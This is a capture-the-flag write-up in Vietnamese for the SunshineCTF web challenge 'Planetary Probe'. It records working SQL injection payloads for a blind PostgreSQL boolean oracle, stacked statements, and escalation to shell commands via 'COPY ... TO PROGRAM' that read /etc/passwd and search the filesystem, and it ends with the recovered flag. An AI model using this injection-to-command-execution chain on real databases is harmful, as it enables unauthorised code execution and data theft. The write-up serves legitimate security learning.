# notes.md — Planetary Probe (SunshineCTF, web 498đ, tác giả valiumaggelein)

URL: `https://planetary.web.2026.sunshinectf.games/` (instance riêng, chỉ 1 endpoint).

## Bề mặt tấn công

* `GET /` — trang console, form `GET /probe?planet=<x>`.
* `GET /probe` — trả về đúng MỘT BIT: `readout--carrier` ("Signal detected") hoặc
  `readout--null` ("No signal"). Không echo input, không lỗi verbose.
* `OPTIONS /probe` -> `Allow: HEAD, OPTIONS, GET`; các route khác 404 (207 byte = Flask mặc định).
  Header lạ (`X-Response: debug`, `X-Admin`, `X-Forwarded-For`), cookie, tham số thừa (`debug`,
  `verbose`, `raw`) đều không đổi phản hồi -> tầng HTTP không có gì, bài thuần SQL blind.

## SQLi

`planet` được ghép thẳng vào literal single-quote:

```sql
SELECT id FROM planets WHERE name = '<payload>'
```

* `MARS' OR 1=1-- ` -> carrier (đúng), `MARS' OR 1=1#` -> null -> **PostgreSQL** (`#` không phải comment).
* Mẹo oracle: `MARS' AND (<expr>)-- ` -> carrier ⟺ `<expr>` đúng (MARS là row thật, nên
  không thể giả mạo bằng điều kiện sai).
* **Payload bị app lower-case toàn bộ**: `ascii('A')=65` sai nhưng `ascii('A')=97` đúng,
  `ascii(chr(65))=65` đúng. -> mọi ký tự in hoa phải dựng bằng `chr()`, và chỉ được so sánh
  bằng số (`ascii`, `length`) để không bị "negative giả".
* Response chỉ có 2 kích thước -> không có channel nào ngoài 1 bit/request.

## Những gì ĐÃ loại trừ (đừng quay lại)

* **Cờ không nằm trong database.** Dump hết: `planets(id,name,diameter_km,description)` 8 row
  (đường kính đều là số thật), `zleak(v)` 1 row = `select v from zleak` (đúng nghĩa đen: bảng
  "để lộ", không phải cờ). `p::text LIKE '%{%'` trên cả hai bảng -> false; `octet_length<>length`
  chỉ có 1 chỗ (dấu gạch dài trong mô tả của earth) -> không có stego điều khiển.
* Không có bảng/ràng buộc/view/khối nào khác: pg_class, pg_attribute (kể cả `attmissingval`),
  pg_proc (`prosrc`), pg_description/pg_shdescription, pg_seclabel, pg_enum, pg_indexes,
  pg_policies, pg_foreign_*, pg_subscription, pg_largeobject, pg_statistic (stavalues 1..4) —
  quét bằng `position(chr(115)||chr(117)||chr(110)||chr(123) in ...)`, có control dương.
  `pg_db_role_setting`/`reloptions` từng "dương" chỉ vì array cast in ra `{...}`.
* `pg_stat_activity` từng báo chứa `sun{` -> **positive giả**: query của chính user. Phải
  `pid<>pg_backend_pid()` + dựng pattern bằng `chr()`.
* Không superuser, không `CREATE` trên schema public (PG15 revoke), `default_transaction_read_only=true`
  ở mức database, không cross-dump `postgres` db.

## Đường thật: stacked statement + exit code của program

`MARS'; SELECT pg_sleep(3); -- ` chậm 3.8 s -> **stacked statement chạy** (lỗi "CREATE TABLE
không tạo ra bảng" chỉ vì PG15 revoke CREATE trên public, không phải vì stacked bị chặn).

Rào cản tâm lý: batch phải **kết thúc bằng SELECT trả row**, nếu không psycopg2 raise và mọi
thứ trả null -> trước đó mình đã hiểu lầm "mọi statement phụ đều bị chặn".

Đòn quyết định:

```
MARS'; COPY (SELECT 1) TO PROGRAM '<cmd>'; SELECT 1; --
```

* `probe` là thành viên `pg_execute_server_program` -> `COPY ... TO PROGRAM` được phép;
  program chạy bằng `/bin/sh -c` với quyền OS user **postgres**.
* Exit code != 0 -> PostgreSQL raise -> app render "no signal" -> **bit thứ hai**, đọc được
  từ CHÍNH FILESYSTEM. Control: `test -f /etc/passwd` = carrier, `test -f /no.such` = null.
* `grep -qE -f -` (pattern từ stdin) KHÔNG hoạt động ở đây, nhưng **double quote không phải
  dấu nháy SQL** nên pattern cứ bọc `"..."` là an toàn; cấm `$` vì shell sẽ expand.

## Đọc cờ

`/flag.txt` tồn tại nhưng rỗng (`test -s` false). File thật tìm bằng TÊN rồi mới đọc nội dung,
và mỗi vị trí là một request độc lập nhờ `cut -c`:

```
f=$(find / -name "*flag*" -type f -exec grep -ls sun{ {} + 2>/dev/null \
      | grep -v /tmp/ | sort | head -1)
grep -aoE "sun[{][^}]*[}]" "$f" | head -1 | cut -c<K> | grep -qE "<class>"
```

Bốn thứ đã làm hỏng các vòng đọc trước, đều là lỗi ở PHÍA mình đo:

* Phải giới hạn theo TÊN file: `grep -r` cả `/var/lib` (thư mục dữ liệu PG) chậm tới mức một số
  request timeout -> timeout đọc thành "không khớp" -> binary search sai im lặng (có lần nó báo
  cờ bắt đầu bằng `0` trong khi `^sun[{]` vẫn True).
* Instance có nhiều replica: không được cache kết quả vào `/tmp` rồi đọc ở request sau (request
  sau rơi container khác). Tệ hơn, `/tmp/.f` của chính user chứa `sun{` nên `grep -rl` trả 2 kết
  quả và mình có lúc đọc lại dữ liệu do mình viết ra. Hai path hợp lệ còn lại là **cùng một file**
  (`cmp -s` xác nhận true).
* Suy case từ phủ định là sai: "`[d]` hoa-thường fail => chắc `D`" biến `d` thành `D` ngẫu nhiên
  vì timeout cũng fail. Quy tắc đúng cần bằng chứng DƯƠNG: `[[:upper:]]` (toàn dấu câu nên không
  bị lower-case hoá) true VÀ `[d]` case-sensitive false.
* Đọc theo prefix (`^prefix<class>`) vừa tuần tự vừa vỡ khi prefix chứa chữ hoa (mình không gõ
  được chữ hoa). `cut -c<K>` cô lập 1 byte -> các vị trí độc lập -> song song được, và case của
  prefix không còn liên quan.
* Quên `^` anchor = '0' giả; quên `{`/`}` trong alphabet = đứng ở vị trí 4; `grep -qiF`, `cat`,
  `md5sum` không tồn tại trong image -> false chỉ vì thiếu tool.

## Kết quả

`definitive.py` / `exploit.py` đọc 35 vị trí, mỗi vị trí xác nhận 2 lần, rồi kiểm toàn chuỗi
bằng `^<bracket-class...>$` (true) kèm hai control âm (sai 1 ký tự cuối -> false, chèn chữ hoa
không có -> false) và `wc -c` = 36.

```
sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}
```

## File

| file | vai trò |
| --- | --- |
| `exploit.py` | chạy trọn chain: xác nhận 2 oracle, đọc cờ, verify toàn chuỗi |
| `extract.py` | oracle SQL qua `MARS' AND (...)-- `, `fan()` đọc song song, `read_str` |
| `definitive.py` | bộ đọc ký tự cuối: `cut -c`, case bằng chứng dương, double-confirm |
| `po.py` / `shell.py` | `COPY ... TO PROGRAM` exit-code oracle, `test -f/-r/-s`, `id -un` |
| `getflag.py` / `flagpos.py` / `final_read.py` | ba vòng trung gian (lỗi đã nêu ở trên) |
| `sweep3.py` | quét `sun{` trong toàn bộ catalog (có control dương) |
| `analysis/` | log từng vòng + schema đã dump |
